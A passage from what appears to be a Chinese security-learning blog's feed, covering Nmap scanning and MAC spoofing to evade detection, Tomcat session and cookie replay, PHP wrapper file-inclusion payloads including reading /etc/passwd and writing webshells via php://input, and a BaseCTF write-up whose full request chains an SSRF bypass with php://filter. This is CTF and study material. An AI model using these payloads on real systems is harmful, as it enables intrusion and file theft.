MAC 地址哄骗</h4><blockquote><p>nmap –spoof-mac &lt;mac 地址&gt; ip </p></blockquote><p>–spoof-mac &lt;mac address，prefix，or vendor name&gt; 参数在Nmap中用于进行MAC地址欺骗，即伪装发送扫描请求的主机的MAC地址。MAC地址（Media Access Control address）是网络设备的唯一标识符。通过欺骗目标主机，改变扫描请求中的MAC地址，可以混淆入侵检测系统，使其难以追踪和识别扫描来源。</p>]]></content>
    
    
    <categories>
      
      <category>Tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>nmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nmap初识</title>
    <link href="/2024/09/16/Nmap%E5%88%9D%E8%AF%86/"/>
    <url>/2024/09/16/Nmap%E5%88%9D%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>web小白又开始学习web了，今天初步了解一下Nmap的功能和使用方法</p><h3 id="主要功能："><a href="#主要功能：" class="headerlink" title="主要功能："></a>主要功能：</h3><ol><li>主机发现： Nmap 可以通过发送网络探测包（ping 扫描）来确定一个网络中活跃的主机。这有助于确定哪些 IP 地址上有活动的设备</li><li>端口扫描： Nmap 可以扫描目标主机的开放端口，帮助确定哪些服务正在运行。它支持多种扫描技术，包括 TCP 扫描、UDP 扫描、SYN&#x2F;ACK 扫描等</li><li>服务识别： Nmap 可以识别目标主机上运行的具体服务和应用程序的版本号。这对于了解目标系统上可能存在的漏洞和弱点很有帮助</li><li>操作系统检测： Nmap 能够尝试检测目标主机的操作系统类型和版本。这有助于识别网络中的不同操作系统，并为后续的渗透测试提供信息。</li><li>脚本扫描： Nmap 支持脚本扫描，允许用户执行自定义脚本以进行更深入的信息收集和安全审计</li><li>版本检测： Nmap 可以检测目标系统上运行的服务的版本信息。这对于确定目标系统上可能存在的已知漏洞和安全问题非常有用。</li><li>输出格式： Nmap 可以生成多种输出格式，包括文本、XML、JSON 等，以便进一步的分析和报告</li></ol><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><h4 id="3-1主机"><a href="#3-1主机" class="headerlink" title="3.1主机"></a>3.1主机</h4><h5 id="3-1-1快速扫描"><a href="#3-1-1快速扫描" class="headerlink" title="3.1.1快速扫描"></a>3.1.1快速扫描</h5><blockquote><p>nmap ip  </p></blockquote><p>上述命令将执行一个默认的 TCP 端口扫描，显示目标主机上开放的端口以及相应的服务信息。</p><h5 id="3-1-2快速扫描"><a href="#3-1-2快速扫描" class="headerlink" title="3.1.2快速扫描"></a>3.1.2快速扫描</h5><blockquote><p>nmap ip ip   </p></blockquote><p>扫描多个目标只需跟上 IP 即可 </p><h5 id="3-1-3-网段扫描"><a href="#3-1-3-网段扫描" class="headerlink" title="3.1.3 网段扫描"></a>3.1.3 网段扫描</h5><blockquote><p>nmap ip&#x2F;子网掩码  </p></blockquote><h5 id="3-1-4-过滤-IP-的网段扫描"><a href="#3-1-4-过滤-IP-的网段扫描" class="headerlink" title="3.1.4 过滤 IP 的网段扫描"></a>3.1.4 过滤 IP 的网段扫描</h5><blockquote><p>nmap ip&#x2F;子网掩码 -exclude 需要过滤的 IP 或 文件</p></blockquote><h5 id="3-1-5-扫描存活主机"><a href="#3-1-5-扫描存活主机" class="headerlink" title="3.1.5 扫描存活主机"></a>3.1.5 扫描存活主机</h5><blockquote><p>nmap -sP ip&#x2F;子网掩码 </p></blockquote><p>仅仅确定存活主机并不扫描端口</p><h4 id="3-2-端口"><a href="#3-2-端口" class="headerlink" title="3.2 端口"></a>3.2 端口</h4><h5 id="Nmap所识别的6个端口状态"><a href="#Nmap所识别的6个端口状态" class="headerlink" title="Nmap所识别的6个端口状态:"></a>Nmap所识别的6个端口状态:</h5><blockquote><p>open(开放的)<br>应用程序正在该端口接收TCP 连接或者UDP报文。发现这一点常常是端口扫描 的主要目标。安全意识强的人们知道每个开放的端口 都是攻击的入口。攻击者或者入侵测试者想要发现开放的端口。 而管理员则试图关闭它们或者用防火墙保护它们以免妨碍了合法用户。 非安全扫描可能对开放的端口也感兴趣，因为它们显示了网络上那些服务可供使用。  </p></blockquote><blockquote><p>closed(关闭的)<br>关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。 它们可以显示该IP地址上(主机发现，或者ping扫描)的主机正在运行up 也对部分操作系统探测有所帮助。 因为关闭的关口是可访问的，也许过会儿值得再扫描一下，可能一些又开放了。 系统管理员可能会考虑用防火墙封锁这样的端口。 那样他们就会被显示为被过滤的状态，下面讨论。</p></blockquote><blockquote><p>filtered(被过滤的)<br>由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由器规则 或者主机上的软件防火墙。这样的端口让攻击者感觉很挫折，因为它们几乎不提供 任何信息。有时候它们响应ICMP错误消息如类型3代码13 (无法到达目标: 通信被管理员禁止)，但更普遍的是过滤器只是丢弃探测帧， 不做任何响应。 这迫使Nmap重试若干次以访万一探测包是由于网络阻塞丢弃的。 这使得扫描速度明显变慢。</p></blockquote><blockquote><p>unfiltered(未被过滤的)<br>未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。 只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。 用其它类型的扫描如窗口扫描，SYN扫描，或者FIN扫描来扫描未被过滤的端口可以帮助确定 端口是否开放。</p></blockquote><blockquote><p>open|filtered(开放或者被过滤的)<br>当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃 了探测报文或者它引发的任何响应。因此Nmap无法确定该端口是开放的还是被过滤的。 UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类。</p></blockquote><blockquote><p>closed|filtered(关闭或者被过滤的)<br>该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。</p></blockquote><h5 id="3-2-1-端口扫描"><a href="#3-2-1-端口扫描" class="headerlink" title="3.2.1 端口扫描"></a>3.2.1 端口扫描</h5><blockquote><p>nmap ip -p 端口号  </p></blockquote><p>扫描「指定端口」，使用 -p 参数，可以一次扫描单个端口、多个端口、或扫描一个范围的端口</p><h5 id="端口范围扫描"><a href="#端口范围扫描" class="headerlink" title="端口范围扫描"></a>端口范围扫描</h5><blockquote><p>nmap ip -p 范围  </p></blockquote><h4 id="3-3-服务"><a href="#3-3-服务" class="headerlink" title="3.3 服务"></a>3.3 服务</h4><h5 id="3-3-1-识别服务版本"><a href="#3-3-1-识别服务版本" class="headerlink" title="3.3.1 识别服务版本"></a>3.3.1 识别服务版本</h5><blockquote><p>nmap -sV ip -p 端口号或范围 </p></blockquote><p>想要识别具体的「服务版本」，可以使用 -sV 参数。</p><h4 id="3-4-系统"><a href="#3-4-系统" class="headerlink" title="3.4 系统"></a>3.4 系统</h4><h5 id="3-4-1-识别操作系统"><a href="#3-4-1-识别操作系统" class="headerlink" title="3.4.1 识别操作系统"></a>3.4.1 识别操作系统</h5><blockquote><p>nmap -O ip  </p></blockquote><p>想要识别「操作系统版本」，可以使用 -O 参数（需要 root 权限）</p>]]></content>
    
    
    <categories>
      
      <category>Tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>nmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2020-9484-tomcat-session持久化</title>
    <link href="/2024/09/16/CVE-2020-9484-tomcat-session%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    <url>/2024/09/16/CVE-2020-9484-tomcat-session%E6%8C%81%E4%B9%85%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.secpulse.com/archives/163637.html">CVE</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jsessionid是什么？</title>
    <link href="/2024/09/16/jsessionid%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
    <url>/2024/09/16/jsessionid%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
    
    <content type="html"><![CDATA[<p>之前不是写了一个爬数据的脚本么，今天发现一个问题，就是jsessonid在刷新之后变了，所以我现在想要找到一个不会变的方法，不过这个修改和学习时间应该会变得比较久，感觉挺高阶的</p><p>看了一些文章将的都是tomcat的的例子，先讲讲什么是session，浏览器第一次访问服务器会生成一个session保存相关信息，会有一个sessionid来对应这个session，<strong>那么我们就想可不可以利用这个id直接去查session的值</strong>  </p><p>tomcat的StandardManager类将session存储在内存中也可以持久化到文件中，sessionid是一个指代session在服务器端位置的值，存储在客户端的cookie上，不会将session保存在本地,session也只能通过invalidate或超时来销毁</p><blockquote><p>那么Session在何时创建呢？当然还是在服务器端程序运行的过程中创建的，不同语言实现的应用程序有不同创建Session的方法，而在Java中是通过调用HttpServletRequest的getSession方法（使用true作为参数）创建的。在创建了Session的同时，服务器会为该Session生成唯一的Session id，而这个Session id在随后的请求中会被用来重新获得已经创建的Session；在Session被创建之后，就可以调用Session相关的方法往Session中增加内容了，而这些内容只会保存在服务器中，发到客户端的只有Session id；当客户端再次发送请求的时候，会将这个Session id带上，服务器接受到请求之后就会依据Session id找到相应的Session，从而再次使用之。</p></blockquote><p>创建：sessionid第一次产生是在直到某server端程序调用 HttpServletRequest.getSession(true)这样的语句时才被创建。</p><p>删除：超时；程序调用HttpSession.invalidate()；程序关闭；</p><p>session存放在哪里：服务器端的内存中。不过session可以通过特殊的方式做持久化管理（memcache，redis）。</p><p>session的id是从哪里来的，sessionID是如何使用的：当客户端第一次请求session对象时候，服务器会为客户端创建一个session，并将通过特殊算法算出一个session的ID，用来标识该session对象</p><p>session会因为浏览器的关闭而删除吗？<br>不会，session只会通过上面提到的方式去关闭。</p><p>下面是tomcat中session的创建：</p><blockquote><p>ManagerBase是所有session管理工具类的基类，它是一个抽象类，所有具体实现session管理功能的类都要继承这个类，该类有一个受保护的方法，该方法就是创建sessionId值的方法：<br>（ tomcat的session的id值生成的机制是一个随机数加时间加上jvm的id值，jvm的id值会根据服务器的硬件信息计算得来，因此不同jvm的id值都是唯一的），<br>StandardManager类是tomcat容器里默认的session管理实现类，<br>它会将session的信息存储到web容器所在服务器的内存里。<br>PersistentManagerBase也是继承ManagerBase类，它是所有持久化存储session信息的基类，PersistentManager继承了PersistentManagerBase，但是这个类只是多了一个静态变量和一个getName方法，目前看来意义不大， 对于持久化存储session，tomcat还提供了StoreBase的抽象类，它是所有持久化存储session的基类，另外tomcat还给出了文件存储FileStore和数据存储JDBCStore两个实现。</p></blockquote><p>所以会出现以下三种情况：</p><blockquote><p>1、server没有关闭，并在session对象销毁时间内，当客户端再次来请求serve端的servlet或jsp时，将会把将第一次请求该serve时生成的sessionid带到请求头上向server端发送，server端收到sessionid后根据此sessionid会去搜索server对应的session对象并直接返回这个session对象，此时不会重新创建session对象。<br>2、当server关闭（之前产生的session对象也就消亡了），或者session对象过了销毁时间，浏览器窗口没有关闭，并在本窗口继续请求server端的servlet或者jsp时，此时同样会将sessionid 发送到 服务端，server拿着id去找对应的session对象；但是此时session对象已经不存在了。所以会重新生成一个session和对应的sessionid ，将这个新的id以响应报文的形式发到浏览器的内核中，重新更新cookie。<br>3、当server没有关闭，并且session对象在其销毁时间内，当请求一个jsp页面返回客户端后，关闭此浏览器窗口，此时其内存中的sessionid也就随之销毁。在重新去请求server端的servlet或者jsp时，会重新生成一个sessionid给客户端浏览器，并且存在浏览器内存中。</p></blockquote><p>我们使用的其实就是将已经存放的cookie来重放获取对应的数据，不过在刷新过后应该会调用HttpSession.invalidate()，并在下次请求时创建一个新的session来进行访问，所以要是想改的的话要么就是对应的服务器端有session持续化保存机制，不然我每隔两天就要手动更新session难受哦，&#x2F;(ㄒoㄒ)&#x2F;~~</p><p><strong>cookie的保存方式有两种：</strong><br>如果没有设置cookie的失效时间，这个cookie就存在与浏览器进程；</p><p>设置了cookie的失效时间，那么这个cookie就存在于硬盘。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Cookie的一些基本设置</span><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;Admin-Token&quot;</span>, token);<br><br>        Cookie[] cookie2 = request.getCookies();<br>        <span class="hljs-comment">//request.getContextPath()   mdrwebrest</span><br>        cookie.setPath(<span class="hljs-string">&quot;/&quot;</span>);        <span class="hljs-comment">//设置cookies有效路径</span><br>        <span class="hljs-comment">//设置cookie有效时间  正数：存到硬盘，负数存到浏览器，0立刻销毁</span><br>        cookie.setMaxAge();      <br>        cookie.setDomain(loginToMDRConfig.getIP()); <span class="hljs-comment">//跨域</span><br>        response.addCookie(cookie);<br></code></pre></td></tr></table></figure><p>下面是实现机制图<br><img src="https://gitee.com/fogpost/photo/raw/master/202409161116311.png" srcset="/img/loading.gif" lazyload><br>文章给出的获取sessionid方法是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">HttpSession session=request.getSession(); <span class="hljs-comment">//获取session</span><br>String sessionid=session.getId();  <span class="hljs-comment">//获取sessionid</span><br>Cookie cookie=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;JSESSIONID&quot;</span>,sessionid); <span class="hljs-comment">//手动设置一个硬盘存储COOKIE，这个cooike时存在硬盘的，不是存在浏览器线程的</span><br>cookie.setMaxAge(<span class="hljs-number">30</span>*<span class="hljs-number">60</span>);<br>response.addCookie(cookie); <span class="hljs-comment">//将COOKIE设置到响应上</span><br></code></pre></td></tr></table></figure><p>其实我们可以假借服务器自己的手，通过burp抓包来实现获取对应的sessionid，进一步获取对应报文(这不就是我之前干过的么，现在学了一遍原理，👿我了)</p><p><a href="https://www.cnblogs.com/Timeouting-Study/p/16082575.html">jsessionid</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>session</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRF</title>
    <link href="/2024/09/16/SSRF/"/>
    <url>/2024/09/16/SSRF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/2288231">web</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>伪协议与文件包含</title>
    <link href="/2024/09/16/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2024/09/16/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h3 id="前置学习要求"><a href="#前置学习要求" class="headerlink" title="前置学习要求"></a>前置学习要求</h3><h4 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h4><blockquote><p>文件包含所可能有的函数<br>php当中会造成文件包含漏洞的函数有：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file<br>实现方法</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span> ?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#GET数据</span><br><span class="hljs-number">2</span> ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=  <span class="hljs-comment">#后面的base64字符是需要传入的字符串的base64编码</span><br><span class="hljs-number">3</span> ?file=php:<span class="hljs-comment">//input [POST DATA:]&lt;?php phpinfo()?&gt;  #POST数据</span><br><span class="hljs-number">4</span> ?file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=xxx.php  #get读源码</span><br></code></pre></td></tr></table></figure><h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><blockquote><p>需要开启allow_url_fopen的：php:&#x2F;&#x2F;input、php:&#x2F;&#x2F;stdin、php:&#x2F;&#x2F;memory和php:&#x2F;&#x2F;temp<br>不需要开启allow_wrl_fopen的：php:&#x2F;&#x2F;filter<br>在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码<br>php:&#x2F;&#x2F;input需要post请求提交数据<br>php:&#x2F;&#x2F;filter可以get提交?a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p></blockquote><h4 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?xxx=data:<span class="hljs-comment">//text/plain;base64,想要file_get_contents()函数返回的值的base64编码</span><br>?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><blockquote><p>File:&#x2F;&#x2F; 访问本地文件系统<br>file:&#x2F;&#x2F; 用于访问本地文件系统，如c:盘中的东西。在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。<br>file:&#x2F;&#x2F; [文件的绝对路径和文件名]<br>linux 系统环境下：?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>winows 系统环境下：?file&#x3D;file:&#x2F;&#x2F;&#x2F;E:\phpStudy\WWW\code\phpinfo.php</p></blockquote><p>总结：File协议用于读取系统文件，c盘关键内容。Php:&#x2F;&#x2F;filter 用来读取文件内容，但是要base64后出来，否则会造成文件执行从而只看到执行结果。Php:&#x2F;&#x2F;input（代码执行）可将post请求中的数据作为PHP代码执行。可以用于写木马。Data和input相似，可以代码执行，但只有在php&lt;5.3且include&#x3D;on时可以写木马。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Basectfweb</title>
    <link href="/2024/09/15/Basectfweb/"/>
    <url>/2024/09/15/Basectfweb/</url>
    
    <content type="html"><![CDATA[<p>web初学者小写几个web题</p><h4 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h4><p>开启页面查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Aura 酱，欢迎回家~</span><br><span class="hljs-comment">// 这里有一份礼物，请你签收一下哟~</span><br><span class="hljs-variable">$pen</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pen&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pen</span>) !== <span class="hljs-string">&#x27;Aura&#x27;</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span><br><span class="hljs-variable">$challenge</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;challenge&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$challenge</span>, <span class="hljs-string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这不是 Aura 的博客！&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$blog_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$challenge</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$blog_content</span>, <span class="hljs-string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="hljs-literal">false</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;请去博客里面写下感想哦~&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span><br><span class="hljs-variable">$gift</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gift&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$gift</span>);<br></code></pre></td></tr></table></figure><p>第一个判断，了解读取文件后的内容是Aura尝试data:&#x2F;&#x2F;为协议来读取<br>第二个判断利用了@的ssrf绕过<br>第三个采用了php伪协议的数据传输</p><pre><code class="hljs">POST / HTTP/1.1Host: challenge.basectf.fun:36145Cache-Control: max-age=0Accept-Language: zh-CNUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Length: 138Content-Type: application/x-www-form-urlencodedpen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@127.0.0.1&amp;gift=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p>&lt;?php &#x2F;&#x2F; BaseCTF{81918213-ed45-40b9-b751-99e831a0bc75}  Aura 酱有拿到一血吗？</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pythonticke</title>
    <link href="/2024/09/15/pythonticke/"/>
    <url>/2024/09/15/pythonticke/</url>
    
    <content type="html"><![CDATA[<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">enum PycMagic &#123;<br>    MAGIC_1_0 = <span class="hljs-number">0x00999902</span>,<br>    MAGIC_1_1 = <span class="hljs-number">0x00999903</span>, /* Also covers <span class="hljs-number">1.2</span> */<br>    MAGIC_1_3 = <span class="hljs-number">0x0A0D2E89</span>,<br>    MAGIC_1_4 = <span class="hljs-number">0x0A0D1704</span>,<br>    MAGIC_1_5 = <span class="hljs-number">0x0A0D4E99</span>,<br>    MAGIC_1_6 = <span class="hljs-number">0x0A0DC4FC</span>,<br> <br>    MAGIC_2_0 = <span class="hljs-number">0x0A0DC687</span>,<br>    MAGIC_2_1 = <span class="hljs-number">0x0A0DEB2A</span>,<br>    MAGIC_2_2 = <span class="hljs-number">0x0A0DED2D</span>,<br>    MAGIC_2_3 = <span class="hljs-number">0x0A0DF23B</span>,<br>    MAGIC_2_4 = <span class="hljs-number">0x0A0DF26D</span>,<br>    MAGIC_2_5 = <span class="hljs-number">0x0A0DF2B3</span>,<br>    MAGIC_2_6 = <span class="hljs-number">0x0A0DF2D1</span>,<br>    MAGIC_2_7 = <span class="hljs-number">0x0A0DF303</span>,<br> <br>    MAGIC_3_0 = <span class="hljs-number">0x0A0D0C3A</span>,<br>    MAGIC_3_1 = <span class="hljs-number">0x0A0D0C4E</span>,<br>    MAGIC_3_2 = <span class="hljs-number">0x0A0D0C6C</span>,<br>    MAGIC_3_3 = <span class="hljs-number">0x0A0D0C9E</span>,<br>    MAGIC_3_4 = <span class="hljs-number">0x0A0D0CEE</span>,<br>    MAGIC_3_5 = <span class="hljs-number">0x0A0D0D16</span>,<br>    MAGIC_3_5_3 = <span class="hljs-number">0x0A0D0D17</span>,<br>    MAGIC_3_6 = <span class="hljs-number">0x0A0D0D33</span>,<br>    MAGIC_3_7 = <span class="hljs-number">0x0A0D0D42</span>,<br>    MAGIC_3_8 = <span class="hljs-number">0x0A0D0D55</span>,<br>    MAGIC_3_9 = <span class="hljs-number">0x0A0D0D61</span>,<br>    MAGIC_3_10 = <span class="hljs-number">0x0A0D0D6F</span>,<br>    MAGIC_3_11 = <span class="hljs-number">0x0A0D0DA7</span>,<br>    MAGIC_3_12 = <span class="hljs-number">0x0A0D0DCB</span>,<br> <br>    INVALID = <span class="hljs-number">0</span>,<br>&#125;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>markdown语法</title>
    <link href="/2024/09/14/markdown%E8%AF%AD%E6%B3%95/"/>
    <url>/2024/09/14/markdown%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs">languagekey1C1cActionScriptactionscriptApacheapacheAppleScriptapplescriptAsciiDocasciidocAspectJasciidocAutoHotkeyautohotkeyAVR AssembleravrasmAxaptaaxaptaBashbashBrainFuckbrainfuckCap’n ProtocapnprotoClojure REPLclojureClojureclojureCMakecmakeCoffeeScriptcoffeescriptC++cppC#csCSScssDdDartdDelphidelphiDiffdiffDjangodjangoDOS.batdosDustdustElixirelixirERB(Embedded Ruby)erbErlang REPLerlang-replErlangerlangFIXfixF#fsharpG-code(ISO 6983)gcodeGherkingherkinGLSLglslGogoGradlegradleGroovygroovyHamlhamlHandlebarshandlebarsHaskellhaskellHaxehaxeHTMLhtmlHTTPhttpIni fileiniJavajavaJavaScriptjavascriptJSONjsonLassolassoLesslessLisplispLiveCodelivecodeserverLiveScriptlivescriptLualuaMakefilemakefileMarkdownmarkdownMathematicamathematicaMatlabmatlabMEL (Maya Embedded Language)melMercurymercuryMizarmizarMonkeymonkeyNginxnginxNimrodnimrodNixnixNSISnsisObjective CobjectivecOCamlocamlOxygeneoxygeneParser 3parser3PerlperlPHPphpPowerShellpowershellProcessingprocessingPython’s profiler outputprofileProtocol BuffersprotobufPuppetpuppetPythonpythonQqRrRenderMan RIBribRoboconfroboconfRenderMan RSLrslRubyrubyOracle Rules LanguageruleslanguageRustrustScalascalaSchemeschemeScilabscilabSCSSscssSmalismaliSmallTalksmalltalkSMLsmlSQLsqlStatastataSTEP Part21(ISO 10303-21)step21StylusstylusSwiftswiftTcltclTextextexttext/plainThriftthriftTwigtwigTypeScripttypescriptValavalaVB.NETvbnetVBScript in HTMLvbscript-htmlVBScriptvbscriptVerilogverilogVHDLvhdlVim ScriptvimIntel x86 Assemblyx86asmXLxlXMLxmlYAMLyml</code></pre>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>爬虫初识</title>
    <link href="/2024/09/14/%E7%88%AC%E8%99%AB%E5%88%9D%E8%AF%86/"/>
    <url>/2024/09/14/%E7%88%AC%E8%99%AB%E5%88%9D%E8%AF%86/</url>
    
